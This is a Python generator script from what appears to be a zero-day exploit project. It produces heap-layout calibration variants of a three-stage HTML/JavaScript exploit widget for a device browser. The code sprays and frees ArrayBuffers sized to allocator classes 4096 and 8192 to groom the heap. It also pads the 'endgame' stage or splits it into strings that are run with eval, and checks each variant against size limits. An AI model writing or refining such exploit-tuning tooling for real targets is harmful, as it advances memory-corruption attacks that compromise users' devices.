#!/usr/bin/env python3
"""c4096 layout-calibration family (host-only).

The 72929 device run proved the class: every c4096 forge probe (base no-op B,
legacyB4957, nab900) returns ABLEN, while the c4096 final (same stage A, B =
7,182-byte endgame) returns NOCORR.  The endgame B changes the pre-stage-A
heap; the stage A is sensitive to that layout at class 4096.

This generator emits layout-calibration finals with the SAME endgame and
stage C, changing only the way b is reached:

  fe0            function expression instead of `function f` (same fsize)
  fe_free_K      function expression + K class-4096 pre-allocations that are
                 freed before b (free-list reorder; the spray reuses them)
  fe_keep_K      function expression + K class-4096 live chunks before b
  padN           current final B padded with N bytes of comment
  splitN         endgame source split into N string chunks (B1..), eval in B2

Every file is checked: raw <= 32768, zlib9 <= 4096, stage A fsize/class
unchanged (diag on the host fork).  No device operation.

Usage: python3 device/widget/universal/gen_c4096_layout.py [--no-write]
"""
import argparse
import hashlib
import json
import os
import re
import subprocess
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "../../.."))  # zeroday_hunt_parser
DEV = os.path.join(ROOT, "device")
WIDGET = os.path.join(DEV, "widget")
UNIV = os.path.join(WIDGET, "universal")
FINAL = os.path.join(UNIV, "c4096_final_ladder_72929.html")
OUT = os.path.join(UNIV, "fix4096")

sys.path.insert(0, DEV)
import gen_stageA_ladder as g  # noqa: E402

CMD_DEV = g.CMD_DEV
CMD_HOST = g.CMD_HOST
B_TARGET = g.B_TARGET
C_TARGET = g.C_TARGET


def parts(path):
    t = open(path, encoding="utf-8").read()
    return {s: re.search(r'<script id="%s">(.*?)</script>' % s, t, re.S).group(1)
            for s in ("stageA", "stageB", "stageC")}


def widget(a, b, c):
    return ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + a + '</script>'
            '<script id="stageB">' + b + '</script>'
            '<script id="stageC">' + c + '</script>')


def widget3(a, b1, b2, c):
    return ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + a + '</script>'
            '<script id="stageB1">' + b1 + '</script>'
            '<script id="stageB2">' + b2 + '</script>'
            '<script id="stageC">' + c + '</script>')


def transform_a(a, preamble):
    m = re.search(r'function f\(\[\] = eval\("\[\]"\)\) \{(.*?)\}\n', a, re.S)
    if not m:
        raise SystemExit("stage A function f not found")
    body = m.group(1)
    rest = a[m.end():]
    return ('"use strict";\n' + preamble +
            'var f=function([] = eval("[]")) {' + body + '};\n' + rest)


def pre_free(k):
    if k == 0:
        return ""
    return ("var W=new Array(%d);for(var i=0;i<%d;i++)W[i]=new ArrayBuffer(4080);"
            "for(var i=0;i<%d;i++)W[i]=null;\n" % (k, k, k))


def pre_keep(k):
    return ("var W=new Array(%d);for(var i=0;i<%d;i++)W[i]=new ArrayBuffer(4080);\n"
            % (k, k))


def pre_free_size(k, size):
    return ("var W=new Array(%d);for(var i=0;i<%d;i++)W[i]=new ArrayBuffer(%d);"
            "for(var i=0;i<%d;i++)W[i]=null;\n" % (k, k, size, k))


def pre_keep_size(k, size):
    return ("var W=new Array(%d);for(var i=0;i<%d;i++)W[i]=new ArrayBuffer(%d);\n"
            % (k, k, size))


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def z9(s):
    return len(zlib.compress(s.encode(), 9))


def diag_fsize(a):
    """Run the fork diag on the raw A; return the outer f FSIZE line."""
    p = "/tmp/opencode/_fix4096_A.js"
    open(p, "w").write(a)
    try:
        r = subprocess.run([os.path.join(ROOT, "build/run_diag"), p],
                           capture_output=True, text=True, timeout=120)
        m = re.search(r"FSIZE name=\S* argc=1 varc=6 cvc=0 cpool=180 bc=\d+ fsize=(\d+)",
                      r.stderr)
        return int(m.group(1)) if m else None
    except Exception:
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--no-write", action="store_true")
    a = ap.parse_args()
    p = parts(FINAL)
    A = p["stageA"]
    C = p["stageC"]
    Bdev = p["stageB"]
    Bhost = g.stage_b(0, 1, CMD_HOST)
    assert len(Bdev) == B_TARGET and len(Bhost) == B_TARGET
    print("source A/B/C", len(A), len(Bdev), len(C))

    variants = []
    # fe0 + free/keep preambles
    for k in (0, 1, 2, 4, 8, 16):
        pre = pre_free(k)
        a2 = transform_a(A, pre)
        name = ("c4096_final_fe0_72929" if k == 0
                else "c4096_final_fe_free%d_72929" % k)
        variants.append((name, a2, "fe_free", k))
    for k in (1, 2, 4, 8):
        a2 = transform_a(A, pre_keep(k))
        variants.append(("c4096_final_fe_keep%d_72929" % k, a2, "fe_keep", k))
    # class-8192 preambles: target the B-string Scudo class (7,182 -> 8192)
    for k in (1, 2, 4, 8):
        a2 = transform_a(A, pre_free_size(k, 8184))
        variants.append(("c4096_final_fe_8192_free%d_72929" % k, a2, "pre8192_free", k))
    for k in (1, 2, 4):
        a2 = transform_a(A, pre_keep_size(k, 8184))
        variants.append(("c4096_final_fe_8192_keep%d_72929" % k, a2, "pre8192_keep", k))
    # mixed class-4096 + class-8192 free preamble
    for k in (1, 2, 4):
        a2 = transform_a(A, pre_free_size(k, 4080) + pre_free_size(k, 8184))
        variants.append(("c4096_final_fe_mix_free%d_72929" % k, a2, "pre_mix", k))
    # B pads
    for n in (256, 512, 1024, 2048, 4096):
        variants.append(("c4096_final_pad%d_72929" % n, A, "pad", n))
    # split endgame
    for n in (2, 3, 4, 6):
        variants.append(("c4096_final_split%d_72929" % n, A, "split", n))

    manifest = []
    worst = 0
    for name, a2, kind, param in variants:
        host = name.replace("_72929", "_host")
        if kind == "pad":
            b = Bdev + "/*" + "P" * (param - 4) + "*/"
            w = widget(a2, b, C)
            bh = Bhost + "/*" + "P" * (param - 4) + "*/"
            wh = widget(a2, bh, C)
        elif kind == "split":
            parts_ = [Bdev[i * len(Bdev) // param:(i + 1) * len(Bdev) // param]
                      for i in range(param)]
            s1 = "".join("var Q%d='%s';" % (i, x) for i, x in enumerate(parts_[:-1]))
            concat = "+".join("Q%d" % i for i in range(param))
            s2 = "var Q%d='%s';var S=%s;eval(S);" % (param - 1, parts_[-1], concat)
            w = widget3(a2, s1, s2, C)
            hparts = [Bhost[i * len(Bhost) // param:(i + 1) * len(Bhost) // param]
                      for i in range(param)]
            h1 = "".join("var Q%d='%s';" % (i, x) for i, x in enumerate(hparts[:-1]))
            h2 = "var Q%d='%s';var S=%s;eval(S);" % (param - 1, hparts[-1], concat)
            wh = widget3(a2, h1, h2, C)
        else:
            w = widget(a2, Bdev, C)
            wh = widget(a2, Bhost, C)
        raw, z = len(w.encode()), z9(w)
        fsz = diag_fsize(a2)
        ok = raw <= 32768 and z <= 4096 and fsz == 3731
        worst = max(worst, z)
        rec = dict(name=name, host=host, kind=kind, param=param,
                   A_len=len(a2), fsize=fsz, raw=raw, zlib9=z,
                   sha256=sha(w), ok=ok)
        manifest.append(rec)
        if not a.no_write:
            os.makedirs(OUT, exist_ok=True)
            open(os.path.join(OUT, name + ".html"), "w").write(w)
            open(os.path.join(OUT, host + ".html"), "w").write(wh)
        print("%-34s %-7s %-5d A=%-5d fsize=%-5s raw=%-5d zlib=%-4d %s" %
              (name, kind, param, len(a2), fsz, raw, z, "OK" if ok else "FAIL"))
    if not a.no_write:
        open(os.path.join(OUT, "MANIFEST.json"), "w").write(
            json.dumps({"source": FINAL, "variants": manifest}, indent=1))
    print("worst zlib9", worst, "/ 4096")
    return 0


if __name__ == "__main__":
    sys.exit(main())
